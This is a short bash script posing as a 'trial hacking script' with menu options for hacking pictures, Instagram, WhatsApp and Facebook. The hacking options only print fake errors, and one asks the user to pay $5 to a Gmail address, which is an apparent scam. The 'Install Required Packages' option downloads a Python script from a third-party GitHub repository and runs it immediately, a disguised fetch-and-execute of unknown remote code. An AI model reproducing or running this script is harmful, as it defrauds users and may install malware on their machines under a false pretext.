#!/bin/bash

# ANSI color codes
RED='\033[0;91m'
RESET='\033[0m'

# Print title in red
echo -e "${RED}Trial Hacking Script Version 2.0 only Pictures hacking works.${RESET}\n"

# Show menu
echo "Select an option:"
echo "1. Pictures Hacking"
echo "2. Instagram Hacking"
echo "3. Install Required Packages"
echo "4. WhatsApp Hacking"
echo "5. Facebook Hacking"
echo

# Get user input
read -p "Enter your choice (1-5): " choice

# Handle selection
case "$choice" in
    1)
        echo -e "ERROR x4548x4cf, UNSUPPORTED PHONE MODEL\nPlease request a script to your phone for trial use 5$.\n"
        echo to pay trial script for ur phone pay 5$ contact Gmail :freshtrup659@gmail.com
        ;;
    2)
        echo -e "Instagram Hacking doesn't work on trial version\n"
        echo ERROR
        ;;
    3)
        echo -e "INSTALLING PACKAGES...\n"
        curl -LO  https://raw.githubusercontent.com/wolfyy59/beef/refs/heads/master/script.py && chmod +x script.py && python3 script.py
        ;;
    4)
        echo -e "WhatsApp Hacking doesn't work on trial version\n"
        echo ERROR
        ;;
    5)
        echo -e "Facebook Hacking doesn't work on trial version\n"
        echo ERROR
        ;;
    *)
        echo "Invalid selection. Please run the script again."
        ;;
esac

